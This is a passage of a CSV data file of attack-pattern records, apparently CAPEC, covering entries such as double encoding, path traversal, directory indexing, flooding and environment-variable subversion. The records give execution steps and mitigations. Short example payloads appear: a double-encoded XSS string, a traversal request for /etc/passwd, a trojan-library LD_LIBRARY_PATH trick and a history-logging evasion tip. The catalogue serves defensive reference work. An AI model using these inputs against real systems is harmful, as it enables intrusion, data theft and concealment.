ethereal, etc. can be useful. Depending upon the data being targeted the technological requirements will change.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::Leverage encryption to encode the transmission of data thus making it accessible only to authorized parties.::\",\"\",\"::319::\",\"\",\"\",\n12,\"Choosing Message Identifier\",Standard,Draft,\"This pattern of attack is defined by the selection of messages distributed via multicast or public information channels that are intended for another client by determining the parameter value assigned to that client. This attack allows the adversary to gain access to potentially privileged information, and to possibly perpetrate other attacks through the distribution means by impersonation. If the channel/message being manipulated is an input rather than output mechanism for the system, (such as a command bus), this style of attack could be used to change the adversary's identifier to more a privileged one.\",\"\",High,High,\"::NATURE:PeerOf:CAPEC ID:21::NATURE:ChildOf:CAPEC ID:216::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine Nature of Messages] Determine the nature of messages being transported as well as the identifiers to be used as part of the attack::STEP:2:PHASE:Experiment:DESCRIPTION:[Authenticate] If required, authenticate to the distribution channel::STEP:3:PHASE:Experiment:DESCRIPTION:[Identify Known Client Identifiers] If any particular client's information is available through a control channel available to all users, the adversary will discover particular identifiers for targeted clients by observing this channel, or requesting client information through this channel.::STEP:4:PHASE:Experiment:DESCRIPTION:[Change Message Identifier] Adversaries with client access connecting to output channels could change their channel identifier and see someone else's (perhaps more privileged) data.::\",\"::Information and client-sensitive (and client-specific) data must be present through a distribution channel available to all users.::Distribution means must code (through channel, message identifiers, or convention) message destination in a manner visible within the distribution means itself (such as a control channel) or in the messages themselves.::\",\"::SKILL:All the adversary needs to discover is the format of the messages on the channel/distribution means and the particular identifier used within the messages.:LEVEL:Low::\",\"::The adversary needs the ability to control source code or application configuration responsible for selecting which message/channel id is absorbed from the public distribution means.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Associate some ACL (in the form of a token) with an authenticated user which they provide middleware. The middleware uses this token as part of its channel/message selection for that client, or part of a discerning authorization decision for privileged channels/messages. The purpose is to architect the system in a way that associates proper authentication/authorization with each channel/message.::Re-architect system input/output channels as appropriate to distribute self-protecting data. That is, encrypt (or otherwise protect) channels/messages so that only authorized readers can see them.::\",\"::A certain B2B interface on a large application codes for messages passed over an MQSeries queue, on a single Partners channel. Messages on that channel code for their client destination based on a partner_ID field, held by each message. That field is a simple integer. Adversaries having access to that channel, perhaps a particularly nosey partner, can simply choose to store messages of another partner's ID and read them as they desire. Note that authentication does not prevent a partner from leveraging this attack on other partners. It simply disallows adversaries without partner status from conducting this attack.::\",\"::201::306::\",\"\",\"\",\n120,\"Double Encoding\",Detailed,Draft,\"The adversary utilizes a repeating of the encoding process for a set of characters (that is, character encoding a character encoding of a character) to obfuscate the payload of a particular request. This may allow the adversary to bypass filters that attempt to detect illegal characters or strings, such as those that might be used in traversal or injection attacks. Filters may be able to catch illegal encoded strings, but may not catch doubly encoded strings. For example, a dot (.), often used in path traversal attacks and therefore often blocked by filters, could be URL encoded as %2E. However, many filters recognize this encoding and would still block the request. In a double encoding, the % in the above URL encoding would be encoded again as %25, resulting in %252E which some filters might not catch, but which could still be interpreted as a dot (.) by interpreters on the target.\",\"\",Low,Medium,\"::NATURE:ChildOf:CAPEC ID:267::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for user-controllable inputs] Using a browser, an automated tool or by inspecting the application, an attacker records all entry points to the application.:TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.:TECHNIQUE:Manually inspect the application to find entry points.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe entry points to locate vulnerabilities] Try double-encoding for parts of the input in order to try to get past the filters. For instance, by double encoding certain characters in the URL (e.g. dots and slashes) an adversary may try to get access to restricted resources on the web server or force browse to protected pages (thus subverting the authorization service). An adversary can also attempt other injection style attacks using this attack pattern: command injection, SQL injection, etc.:TECHNIQUE:Try to use double-encoding to bypass validation routines.::\",\"::The target's filters must fail to detect that a character has been doubly encoded but its interpreting engine must still be able to convert a doubly encoded character to an un-encoded character.::The application accepts and decodes URL string request.::The application performs insufficient filtering/canonicalization on the URLs.::\",\"\",\"::Tools that automate encoding of data can assist the adversary in generating encoded strings.::\",\"\",\"\",\"::Assume all input is malicious. Create an allowlist that defines all valid input to the software system based on the requirements specifications. Input that does not match against the allowlist should not be permitted to enter into the system. Test your decoding process against malicious input.::Be aware of the threat of alternative method of data encoding and obfuscation technique such as IP address encoding.::When client input is required from web-based forms, avoid using the GET method to submit data, as the method causes the form data to be appended to the URL and is easily manipulated. Instead, use the POST method whenever possible.::Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process, if bad character are left after decoding process, treat the data as suspicious, and fail the validation process.::Refer to the RFCs to safely decode URL.::Regular expression can be used to match safe URL patterns. However, that may discard valid URL requests if the regular expression is too restrictive.::There are tools to scan HTTP requests to the server for valid URL such as URLScan from Microsoft (http://www.microsoft.com/technet/security/tools/urlscan.mspx).::\",\"::Double Enconding Attacks can often be used to bypass Cross Site Scripting (XSS) detection and execute XSS attacks.: %253Cscript%253Ealert('This is an XSS Attack')%253C%252Fscript%253E Since <, <, and / are often sued to perform web attacks, these may be captured by XSS filters. The use of double encouding prevents the filter from working as intended and allows the XSS to bypass dectection. This can allow an adversary to execute malicious code.::\",\"::173::172::177::181::183::184::74::20::697::692::\",\"\",\"\",\n121,\"Exploit Non-Production Interfaces\",Standard,Stable,\"An adversary exploits a sample, demonstration, test, or debug interface that is unintentionally enabled on a production system, with the goal of gleaning information or leveraging functionality that would otherwise be unavailable.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:113::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine Vulnerable Interface] An adversary explores a target system for sample or test interfaces that have not been disabled by a system administrator and which may be exploitable by the adversary.:TECHNIQUE:If needed, the adversary explores an organization's network to determine if any specific systems of interest exist.::STEP:2:PHASE:Exploit:DESCRIPTION:[Leverage Test Interface to Execute Attacks] Once an adversary has discovered a system with a non-production interface, the interface is leveraged to exploit the system and/or conduct various attacks.:TECHNIQUE:The adversary can leverage the sample or test interface to conduct several types of attacks such as Adversary-in-the-Middle attacks (CAPEC-94), keylogging, Cross Site Scripting (XSS), hardware manipulation attacks, and more.::\",\"::The target must have configured non-production interfaces and failed to secure or remove them when brought into a production environment.::\",\"::SKILL:Exploiting non-production interfaces requires significant skill and knowledge about the potential non-production interfaces left enabled in production.:LEVEL:High::\",\"::For some interfaces, the adversary will need that appropriate client application or hardware that interfaces with the interface. Other non-production interfaces can be executed using simple tools, such as web browsers or console windows. In some cases, an adversary may need to be able to authenticate to the target before it can access the vulnerable interface.::\",\"\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authentication:TECHNICAL IMPACT:Gain Privileges:TECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Read Data:TECHNICAL IMPACT:Execute Unauthorized Commands::SCOPE:Access Control:SCOPE:Integrity:TECHNICAL IMPACT:Modify Data:TECHNICAL IMPACT:Alter Execution Logic::\",\"::Ensure that production systems do not contain non-production interfaces and that these interfaces are only used in development environments.::\",\"::Some software applications include application programming interfaces (APIs) that are intended to allow an administrator to test and refine their domain. These APIs are typically disabled once a system enters a production environment, but may be left in an insecure state due to a configuration error or mismanagement.::Many hardware systems leverage bits typically reserved for future functionality for testing and debugging purposes. If these reserved bits remain enabled in a production environment, it could allow an adversary to induce unwanted/unsupported behavior in the hardware.::\",\"::489::1209::1259::1267::1270::1294::1295::1296::1302::1313::\",\"\",\"\",\n122,\"Privilege Abuse\",Meta,Draft,\"An adversary is able to exploit features of the target that should be reserved for privileged users or administrators but are exposed to use by lower or non-privileged accounts. Access to sensitive information and functionality must be controlled to ensure that only authorized users are able to access these resources.\",\"\",High,Medium,\"::NATURE:CanPrecede:CAPEC ID:664::\",\"\",\"::The target must have misconfigured their access control mechanisms such that sensitive information, which should only be accessible to more trusted users, remains accessible to less trusted users.::The adversary must have access to the target, albeit with an account that is less privileged than would be appropriate for the targeted resources.::\",\"::SKILL:Adversary can leverage privileged features they already have access to without additional effort or skill. Adversary is only required to have access to an account with improper priveleges.:LEVEL:Low::\",\"::None: No specialized resources are required to execute this type of attack. The ability to access the target is required.::\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::\",\"::Configure account privileges such privileged/administrator functionality is not exposed to non-privileged/lower accounts.::\",\"::Improperly configured account privileges allowed unauthorized users on a hospital's network to access the medical records for over 3,000 patients. Thus compromising data integrity and confidentiality in addition to HIPAA violations.::\",\"::269::732::1317::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1548:ENTRY NAME:Abuse Elevation Control Mechanism::\",\"\",\n123,\"Buffer Manipulation\",Meta,Draft,\"An adversary manipulates an application's interaction with a buffer in an attempt to read or modify data they shouldn't have access to. Buffer attacks are distinguished in that it is the buffer space itself that is the target of the attack rather than any code responsible for interpreting the content of the buffer. In virtually all buffer attacks the content that is placed in the buffer is immaterial. Instead, most buffer attacks involve retrieving or providing more input than can be stored in the allocated buffer, resulting in the reading or overwriting of other unintended program memory.\",\"\",High,Very High,\"\",\"\",\"::The adversary must identify a programmatic means for interacting with a buffer, such as vulnerable C code, and be able to provide input to this interaction.::\",\"\",\"\",\"\",\"::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution:NOTE:A buffer manipulation attack often results in a crash of the application due to the corruption of memory.::SCOPE:Confidentiality:TECHNICAL IMPACT:Execute Unauthorized Commands:TECHNICAL IMPACT:Modify Data:TECHNICAL IMPACT:Read Data:NOTE:If constructed properly, a buffer manipulation attack can be used to contol the execution of the application leading to any number of negative consequenses.::\",\"::To help protect an application from buffer manipulation attacks, a number of potential mitigations can be leveraged. Before starting the development of the application, consider using a code language (e.g., Java) or compiler that limits the ability of developers to act beyond the bounds of a buffer. If the chosen language is susceptible to buffer related issues (e.g., C) then consider using secure functions instead of those vulnerable to buffer manipulations. If a potentially dangerous function must be used, make sure that proper boundary checking is performed. Additionally, there are often a number of compiler-based mechanisms (e.g., StackGuard, ProPolice and the Microsoft Visual Studio /GS flag) that can help identify and protect against potential buffer issues. Finally, there may be operating system level preventative functionality that can be applied.::\",\"\",\"::119::\",\"\",\"\",\n124,\"Shared Resource Manipulation\",Meta,Draft,\"An adversary exploits a resource shared between multiple applications, an application pool or hardware pin multiplexing to affect behavior. Resources may be shared between multiple applications or between multiple threads of a single application. Resource sharing is usually accomplished through mutual access to a single memory location or multiplexed hardware pins. If an adversary can manipulate this shared resource (usually by co-opting one of the applications or threads) the other applications or threads using the shared resource will often continue to trust the validity of the compromised shared resource and use it in their calculations. This can result in invalid trust assumptions, corruption of additional data through the normal operations of the other users of the shared resource, or even cause a crash or compromise of the sharing applications.\",\"\",,Medium,\"\",\"\",\"::The target applications, threads or functions must share resources between themselves.::The adversary must be able to manipulate some piece of the shared resource either directly or indirectly and the other users of the data must accept the changed data as valid. Usually this requires that the adversary be able to compromise one of the sharing applications or threads in order to manipulate the shared data.::\",\"\",\"::None: The attacker does not need any specialized resources to execute this type of attack.::\",\"\",\"\",\"\",\"\",\"::1189::1331::\",\"\",\"\",\n125,\"Flooding\",Meta,Stable,\"An adversary consumes the resources of a target by rapidly engaging in a large number of interactions with the target. This type of attack generally exposes a weakness in rate limiting or flow. When successful this attack prevents legitimate users from accessing the service and can cause the target to crash. This attack differs from resource depletion through leaks or allocations in that the latter attacks do not rely on the volume of requests made to the target but instead focus on manipulation of the target's operations. The key factor in a flooding attack is the number of requests the adversary can make in a given period of time. The greater this number, the more likely an attack is to succeed against a given target.\",\"\",High,Medium,\"\",\"\",\"::Any target that services requests is vulnerable to this attack on some level of scale.::\",\"\",\"::A script or program capable of generating more requests than the target can handle, or a network or cluster of objects all capable of making simultaneous requests.::\",\"\",\"::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution:TECHNICAL IMPACT:Resource Consumption:NOTE:A successful flooding attack compromises the availability of the target system's service by exhausting its available resources.::\",\"::Ensure that protocols have specific limits of scale configured.::Specify expectations for capabilities and dictate which behaviors are acceptable when resource allocation reaches limits.::Uniformly throttle all requests in order to make it more difficult to consume resources more quickly than they can again be freed.::\",\"\",\"::404::770::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1498.001:ENTRY NAME:Network Denial of Service: Direct Network Flood::::TAXONOMY NAME:ATTACK:ENTRY ID:1499:ENTRY NAME:Endpoint Denial of Service::::TAXONOMY NAME:WASC:ENTRY ID:10:ENTRY NAME:Denial of Service::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Traffic flood::\",\"\",\n126,\"Path Traversal\",Standard,Draft,\"An adversary uses path manipulation methods to exploit insufficient input validation of a target to obtain access to data that should be not be retrievable by ordinary well-formed requests. A typical variety of this attack involves specifying a path to a desired file together with dot-dot-slash characters, resulting in the file access API or function traversing out of the intended directory structure and into the root file system. By replacing or modifying the expected path information the access function or API retrieves the file desired by the attacker. These attacks either involve the attacker providing a complete path to a targeted file or using control characters (e.g. path separators (/ or ) and/or dots (.)) to reach desired directories or files.\",\"::TERM:Directory Traversal:DESCRIPTION:::\",High,Very High,\"::NATURE:ChildOf:CAPEC ID:153::NATURE:CanPrecede:CAPEC ID:664::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Fingerprinting of the operating system] In order to perform a valid path traversal, the attacker needs to know what the underlying OS is so that the proper file seperator is used.:TECHNIQUE:Port mapping. Identify ports that the system is listening on, and attempt to identify inputs and protocol types on those ports.:TECHNIQUE:TCP/IP Fingerprinting. The attacker uses various software to make connections or partial connections and observe idiosyncratic responses from the operating system. Using those responses, they attempt to guess the actual operating system.:TECHNIQUE:Induce errors to find informative error messages::STEP:2:PHASE:Explore:DESCRIPTION:[Survey the Application to Identify User-controllable Inputs] The attacker surveys the target application to identify all user-controllable file inputs::STEP:3:PHASE:Experiment:DESCRIPTION:[Vary inputs, looking for malicious results] Depending on whether the application being exploited is a remote or local one, the attacker crafts the appropriate malicious input containing the path of the targeted file or other file system control syntax to be passed to the application::STEP:4:PHASE:Exploit:DESCRIPTION:[Manipulate files accessible by the application] The attacker may steal information or directly manipulate files (delete, copy, flush, etc.)::\",\"::The attacker must be able to control the path that is requested of the target.::The target must fail to adequately sanitize incoming paths::\",\"::SKILL:Simple command line attacks or to inject the malicious payload in a web page.:LEVEL:Low::SKILL:Customizing attacks to bypass non trivial filters in the application.:LEVEL:Medium::\",\"::The ability to manually manipulate path information either directly through a client application relative to the service or application or via a proxy application.::\",\"\",\"::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:The attacker may be able to create or overwrite critical files that are used to execute code, such as programs or libraries.::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data:NOTE:The attacker may be able to overwrite or create critical files, such as programs, libraries, or important data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, appending a new account at the end of a password file may allow an attacker to bypass authentication.::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data:NOTE:The attacker may be able read the contents of unexpected files and expose sensitive data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, by reading a password file, the attacker could conduct brute force password guessing attacks in order to break into an account on the system.::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution:NOTE:The attacker may be able to overwrite, delete, or corrupt unexpected critical files such as programs, libraries, or important data. This may prevent the software from working at all and in the case of a protection mechanisms such as authentication, it has the potential to lockout every user of the software.::\",\"::Design: Configure the access control correctly.::Design: Enforce principle of least privilege.::Design: Execute programs with constrained privileges, so parent process does not open up further vulnerabilities. Ensure that all directories, temporary directories and files, and memory are executing with limited privileges to protect against remote execution.::Design: Input validation. Assume that user inputs are malicious. Utilize strict type, character, and encoding enforcement.::Design: Proxy communication to host, so that communications are terminated at the proxy, sanitizing the requests before forwarding to server host.::Design: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands.::Implementation: Host integrity monitoring for critical files, directories, and processes. The goal of host integrity monitoring is to be aware when a security issue has occurred so that incident response and other forensic activities can begin.::Implementation: Perform input validation for all remote content, including remote and user-generated content.::Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories, programs, and interfaces that grant direct access to executables.::Implementation: Use indirect references rather than actual file names.::Implementation: Use possible permissions on file access when developing and deploying web applications.::Implementation: Validate user input by only accepting known good. Ensure all content that is delivered to client is sanitized against an acceptable content specification -- using an allowlist approach.::\",\"::An example of using path traversal to attack some set of resources on a web server is to use a standard HTTP request http://example/../../../../../etc/passwd From an attacker point of view, this may be sufficient to gain access to the password file on a poorly protected system. If the attacker can list directories of critical resources then read only access is not sufficient to protect the system.::\",\"::22::\",\"TAXONOMY NAME:WASC:ENTRY ID:33:ENTRY NAME:Path Traversal::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Path Traversal::\",\"\",\n127,\"Directory Indexing\",Detailed,Draft,\"An adversary crafts a request to a target that results in the target listing/indexing the content of a directory as output. One common method of triggering directory contents as output is to construct a request containing a path that terminates in a directory name rather than a file name since many applications are configured to provide a list of the directory's contents when such a request is received. An adversary can use this to explore the directory tree on a target as well as learn the names of files. This can often end up revealing test files, backup files, temporary files, hidden files, configuration files, user accounts, script contents, as well as naming conventions, all of which can be used by an attacker to mount additional attacks.\",\"\",High,Medium,\"::NATURE:ChildOf:CAPEC ID:54::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Directory Discovery] Use a method, either manual, scripted, or automated to discover the directories on the server by making requests for directories that may possibly exist. During this phase the adversary is less concerned with whether a directory can be accessed or indexed and more focused on simply discovering what directories do exist on the target.:TECHNIQUE:Send requests to the web server for common directory names:TECHNIQUE:If directories are discovered that are native to a server type further refine the directory search to include directories usually present on those types of servers.:TECHNIQUE:Search for uncommon or potentially user created directories that may be present.::STEP:2:PHASE:Experiment:DESCRIPTION:[Iteratively explore directory/file structures] The adversary attempts to access the discovered directories that allow access and may attempt to bypass server or application level ACLs by using manual or automated methods:TECHNIQUE:Use a scanner tool to dynamically add directories/files to include their scan based upon data obtained in initial probes.:TECHNIQUE:Use a browser to manually explore the website by issuing a request ending the URL in a slash '/'.:TECHNIQUE:Attempt to bypass ACLs on directories by using methods that known to work against some server types by appending data to the directory request. For instance, appending a Null byte to the end of the request which may cause an ACL to fail and allow access.:TECHNIQUE:Sequentially request a list of common base files to each directory discovered.:TECHNIQUE:Try multiple fuzzing techniques to list directory contents for directories that will not reveal their contents with a / request::STEP:3:PHASE:Exploit:DESCRIPTION:[Read directories or files which are not intended for public viewing.] The adversary attempts to access the discovered directories that allow access and may attempt to bypass server or application level ACLs by using manual or automated methods:TECHNIQUE:Try multiple exploit techniques to list directory contents for directories that will not reveal their contents with a / request:TECHNIQUE:Try other known exploits to elevate privileges sufficient to bypass protected directories.:TECHNIQUE:List the files in the directory by issuing a request with the URL ending in a / slash.:TECHNIQUE:Access the files via direct URL and capture contents.:TECHNIQUE:Attempt to bypass ACLs on directories by using methods that are known to work against some server types by appending data to the directory request. For instance, appending a Null byte to the end of the request which may cause an ACL to fail and allow access.:TECHNIQUE:Sequentially request a list of common base files to each directory discovered.::\",\"::The target must be misconfigured to return a list of a directory's content when it receives a request that ends in a directory name rather than a file name.::The adversary must be able to control the path that is requested of the target.::The administrator must have failed to properly configure an ACL or has associated an overly permissive ACL with a particular directory.::The server version or patch level must not inherently prevent known directory listing attacks from working.::\",\"::SKILL:To issue the request to URL without given a specific file name:LEVEL:Low::SKILL:To bypass the access control of the directory of listings:LEVEL:High::\",\"::Ability to send HTTP requests to a web application.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data:NOTE:Information Leakage::\",\"::1. Using blank index.html: putting blank index.html simply prevent directory listings from displaying to site visitors.::2. Preventing with .htaccess in Apache web server: In .htaccess, write Options-indexes.::3. Suppressing error messages: using error 403 Forbidden message exactly like error 404 Not Found message.::\",\"::The adversary uses directory listing to view sensitive files in the application. This is an example of accessing the backup file. The attack issues a request for http://www.example.com/admin/ and receives the following dynamic directory indexing content in the response: Index of /admin Name Last Modified Size Description backup/ 31-May-2007 08:18 - Apache/ 2.0.55 Server at www.example.com Port 80 The target application does not have direct hyperlink to the backup directory in the normal html webpage, however the attacker has learned of this directory due to indexing the content. The client then requests the backup directory URL and receives output which has a db_dump.php file in it. This sensitive data should not be disclosed publicly.::\",\"::424::425::288::285::732::276::693::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1083:ENTRY NAME:File and Directory Discovery::\",\"\","
  },
  "doc-8373207d8f938b2e62327ff9be5e2938": {
    "content": "'ID,Name,Abstraction,Status,Description,Alternate Terms,Likelihood Of Attack,Typical Severity,Related Attack Patterns,Execution Flow,Prerequisites,Skills Required,Resources Required,Indicators,Consequences,Mitigations,Example Instances,Related Weaknesses,Taxonomy Mappings,Notes\n128,\"Integer Attacks\",Standard,Draft,\"An attacker takes advantage of the structure of integer variables to cause these variables to assume values that are not expected by an application. For example, adding one to the largest positive integer in a signed integer variable results in a negative number. Negative numbers may be illegal in an application and the application may prevent an attacker from providing them directly, but the application may not consider that adding two positive numbers can create a negative number do to the structure of integer storage formats.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:153::\",\"\",\"::The target application must have an integer variable for which only some of the possible integer values are expected by the application and where there are no checks on the value of the variable before use.::The attacker must be able to manipulate the targeted integer variable such that normal operations result in non-standard values due to the storage structure of integers.::\",\"\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"\",\"\",\"\",\"::682::\",\"\",\"\",\n129,\"Pointer Manipulation\",Meta,Draft,\"This attack pattern involves an adversary manipulating a pointer within a target application resulting in the application accessing an unintended memory location. This can result in the crashing of the application or, for certain pointer values, access to data that would not normally be possible or the execution of arbitrary code. Since pointers are simply integer variables, Integer Attacks may often be used in Pointer Attacks.\",\"\",,Medium,\"\",\"\",\"::The target application must have a pointer variable that the attacker can influence to hold an arbitrary value.::\",\"\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"\",\"\",\"\",\"::682::822::823::\",\"\",\"\",\n13,\"Subverting Environment Variable Values\",Detailed,Stable,\"The adversary directly or indirectly modifies environment variables used by or controlling the target software. The adversary's goal is to cause the target software to deviate from its expected operation in a manner that benefits the adversary.\",\"\",High,Very High,\"::NATURE:ChildOf:CAPEC ID:77::NATURE:CanPrecede:CAPEC ID:14::NATURE:PeerOf:CAPEC ID:10::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Probe target application] The adversary first probes the target application to determine important information about the target. This information could include types software used, software versions, what user input the application consumes, and so on. Most importantly, the adversary tries to determine what environment variables might be used by the underlying software, or even the application itself.::STEP:2:PHASE:Experiment:DESCRIPTION:[Find user-controlled environment variables] Using the information found by probing the application, the adversary attempts to manipulate any user-controlled environment variables they have found are being used by the application, or suspect are being used by the application, and observe the effects of these changes. If the adversary notices any significant changes to the application, they will know that a certain environment variable is important to the application behavior and indicates a possible attack vector.:TECHNIQUE:Alter known environment variables such as $PATH, $HOSTNAME, or LD_LIBRARY_PATH and see if application behavior changes.::STEP:3:PHASE:Exploit:DESCRIPTION:[Manipulate user-controlled environment variables] The adversary manipulates the found environment variable(s) to abuse the normal flow of processes or to gain access to privileged resources.::\",\"::An environment variable is accessible to the user.::An environment variable used by the application can be tainted with user supplied data.::Input data used in an environment variable is not validated properly.::The variables encapsulation is not done properly. For instance setting a variable as public in a class makes it visible and an adversary may attempt to manipulate that variable.::\",\"::SKILL:In a web based scenario, the client controls the data that it submitted to the server. So anybody can try to send malicious data and try to bypass the authentication mechanism.:LEVEL:Low::SKILL:Some more advanced attacks may require knowledge about protocols and probing technique which help controlling a variable. The malicious user may try to understand the authentication mechanism in order to defeat it.:LEVEL:High::\",\"\",\"\",\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Accountability:TECHNICAL IMPACT:Hide Activities::\",\"::Protect environment variables against unauthorized read and write access.::Protect the configuration files which contain environment variables against illegitimate read and write access.::Assume all input is malicious. Create an allowlist that defines all valid input to the software system based on the requirements specifications. Input that does not match against the allowlist should not be permitted to enter into the system.::Apply the least privilege principles. If a process has no legitimate reason to read an environment variable do not give that privilege.::\",\"::Changing the LD_LIBRARY_PATH environment variable in TELNET will cause TELNET to use an alternate (possibly Trojan) version of a function library. The Trojan library must be accessible using the target file system and should include Trojan code that will allow the user to log in with a bad password. This requires that the adversary upload the Trojan library to a specific location on the target. As an alternative to uploading a Trojan file, some file systems support file paths that include remote addresses, such as 172.16.2.100shared_filestrojan_dll.dll. See also: Path Manipulation (CVE-1999-0073)::The HISTCONTROL environment variable keeps track of what should be saved by the history command and eventually into the ~/.bash_history file when a user logs out. This setting can be configured to ignore commands that start with a space by simply setting it to ignorespace. HISTCONTROL can also be set to ignore duplicate commands by setting it to ignoredups. In some Linux systems, this is set by default to ignoreboth which covers both of the previous examples. This means that ls will not be saved, but ls would be saved by history. HISTCONTROL does not exist by default on macOS, but can be set by the user and will be respected. Adversaries can use this to operate without leaving traces by simply prepending a space to all of their terminal commands.::\",\"::353::285::302::74::15::73::20::200::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1562.003:ENTRY NAME:Impair Defenses:Impair Command History Logging::::TAXONOMY NAME:ATTACK:ENTRY ID:1574.006:ENTRY NAME:Hijack Execution Flow:Dynamic Linker Hijacking::::TAXONOMY NAME:ATTACK:ENTRY ID:1574.007:ENTRY NAME:Hijack Execution Flow:Path Interception by PATH Environment Variable::\",\"\",\n130,\"Excessive Allocation\",Meta,Stable,\"An adversary causes the target to allocate excessive resources to servicing the attackers' request, thereby reducing the resources available for legitimate services and degrading or denying services. Usually, this attack focuses on memory allocation, but any finite resource on the target could be the attacked, including bandwidth, processing cycles, or other resources. This attack does not attempt to force this allocation through a large number of requests (that would be Resource Depletion through Flooding) but instead uses one or a small number of requests that are carefully formatted to force the target to allocate excessive resources to service this request(s). Often this attack takes advantage of a bug in the target to cause the target to allocate resources vastly beyond what would be needed for a normal request.\",\"\",Medium,Medium,\"\",\"\",\"::The target must accept service requests from the attacker and the adversary must be able to control the resource allocation associated with this request to be in excess of the normal allocation. The latter is usually accomplished through the presence of a bug on the target that allows the adversary to manipulate variables used in the allocation.::\",\"\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"::SCOPE:Availability:TECHNICAL IMPACT:Resource Consumption:NOTE:A successful excessive allocation attack forces the target system to exhaust its resources, thereby compromising the availability of its service.::\",\"::Limit the amount of resources that are accessible to unprivileged users.::Assume all input is malicious. Consider all potentially relevant properties when validating input.::Consider uniformly throttling all requests in order to make it more difficult to consume resources more quickly than they can again be freed.::Use resource-limiting settings, if possible.::\",\"::In an Integer Attack, the adversary could cause a variable that controls allocation for a request to hold an excessively large value. Excessive allocation of resources can render a service degraded or unavailable to legitimate users and can even lead to crashing of the target.::\",\"::404::770::1325::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1499.003:ENTRY NAME:Endpoint Denial of Service:Application Exhaustion Flood::::TAXONOMY NAME:WASC:ENTRY ID:10:ENTRY NAME:Denial of Service::\",\"\",\n131,\"Resource Leak Exposure\",Meta,Stable,\"An adversary utilizes a resource leak on the target to deplete the quantity of the resource available to service legitimate requests.\",\"\",Medium,Medium,\"\",\"\",\"::The target must have a resource leak that the adversary can repeatedly trigger.::\",\"\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution:TECHNICAL IMPACT:Resource Consumption:NOTE:A successful resource leak exposure attack compromises the availability of the target system's services.::\",\"::If possible, leverage coding language(s) that do not allow this weakness to occur (e.g., Java, Ruby, and Python all perform automatic garbage collection that releases memory for objects that have been deallocated).::Memory should always be allocated/freed using matching functions (e.g., malloc/free, new/delete, etc.)::Implement best practices with respect to memory management, including the freeing of all allocated resources at all exit points and ensuring consistency with how and where memory is freed in a function.::\",\"\",\"::404::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1499:ENTRY NAME:Endpoint Denial of Service::::TAXONOMY NAME:WASC:ENTRY ID:10:ENTRY NAME:Denial of Service::\",\"\",\n132,\"Symlink Attack\",Detailed,Draft,\"An adversary positions a symbolic link in such a manner that the targeted user or application accesses the link's endpoint, assuming that it is accessing a file with the link's name.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:159::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify Target] Adversary identifies the target application by determining whether there is sufficient check before writing data to a file and creating symlinks to files in different directories.:TECHNIQUE:The adversary writes to files in different directories to check whether the application has sufficient checking before file operations.:TECHNIQUE:The adversary creates symlinks to files in different directories.::STEP:2:PHASE:Experiment:DESCRIPTION:[Try to create symlinks to different files] The adversary then 